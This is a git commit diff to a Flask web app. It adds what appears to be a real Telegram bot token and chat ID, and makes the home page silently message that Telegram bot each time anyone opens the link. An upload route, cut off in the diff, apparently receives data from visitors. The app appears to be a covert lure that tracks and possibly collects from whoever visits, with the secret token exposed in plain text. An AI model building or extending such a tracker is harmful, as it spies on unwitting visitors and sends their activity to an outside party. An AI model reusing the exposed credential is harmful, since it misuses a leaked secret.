88b9a19b49397e0a2b56a96147c782594786543a
Hosam3 <hhmmaa226@gmail.com>
2026-03-02 02:03:52 +0000

    Update Telegram Data

--- app.py
+++ app.py
@@ -3,13 +3,12 @@ import requests
 import base64
 app = Flask(__name__)
 
-TOKEN = 'جف_حشا_تمنش_البمت'
-ID = 'جف_حشا_الأيدي_الخاص_بن'
+TOKEN = '8639009325:AAEqWTIdefasWQ8Hkr8i3mQck18AjBdwGpE'
+ID = '5360002210'
 
 @app.route('/')
 def index():
-    # رطالآ اختبار تصلن بمجرد فتح أي شخص للرابط
-    requests.get(f'https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={ID}&text=تم_فتح_الرابط_الآن')
+    requests.get(f'https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={ID}&text=Link_Opened_Success')
     return render_template('index.html')
 
 @app.route('/upload', methods=['POST'])
